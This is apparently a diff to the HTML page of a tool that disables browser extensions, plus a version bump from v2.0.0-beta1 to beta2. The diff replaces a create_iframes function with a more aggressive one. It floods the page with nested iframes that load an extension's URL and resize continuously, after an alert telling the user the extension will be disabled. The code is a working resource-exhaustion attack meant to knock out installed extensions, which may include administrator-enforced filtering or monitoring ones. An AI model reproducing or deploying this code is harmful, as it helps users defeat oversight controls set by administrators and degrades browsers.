@@ -224,22 +224,51 @@
         alert("Hit OK, then wait a few seconds, after which the extension will be disabled.");
         create_iframes(extension);
       }
+      
+      function create_iframes(extension) {
+        let iframes = []
+        let iterations = 5;
+        let public_url = extension.url;
+        
+        setInterval(() => {
+          let iframe = document.createElement("iframe");
+          document.body.append(iframe);
+          iframes.push(iframe);
 
+          //let subframe_count = Math.max(2, 200 - iterations);
+          for (let i=0; i<50; i++) {
+            let subframe = document.createElement("iframe");
+            subframe.src = public_url;
+            subframe.height = 100;
+            subframe.width = 1;
+            setInterval(() => {subframe.width = Math.random()*100}, 0);
+            iframe.contentDocument.body.append(subframe);
+          }
+
+          while (iframes.length > Math.max(3, 10-iterations)) {
+            iframes[0].remove();
+            iframes.shift();
+          }
+
+          iterations++;
+        }, 0);
+      }
+      /*
       function create_iframes(extension) {
         for (let i=0; i<20; i++) {
           let iframe = document.createElement("iframe");
           iframe.src = extension.url;
-          iframe.height = 1;
+          iframe.height = 100;
           iframe.width = 1;
           iframe.onload = () => {
-              setInterval(() => {iframe.width = Math.random()*10}, 0);
-              setTimeout(() => {
-                  setInterval(() => {iframe.src = iframe.src}, 5000);    
-              }, Math.random()*5000)
+            setInterval(() => {iframe.width = Math.random()*100}, 0);
+            setTimeout(() => {
+              setInterval(() => {iframe.src = iframe.src}, 1000);    
+            }, Math.random()*5000)
           };
           document.body.append(iframe);
         }
-      }
+      }*/
 
       window.onload = main;
     </script>
@@ -283,7 +312,7 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.</pre>
-        <p style="font-size: 13px; text-align: right;"><i>Version v2.0.0-beta1</i></p>
+        <p style="font-size: 13px; text-align: right;"><i>Version v2.0.0-beta2</i></p>
       </details>
     </div>
   </body>
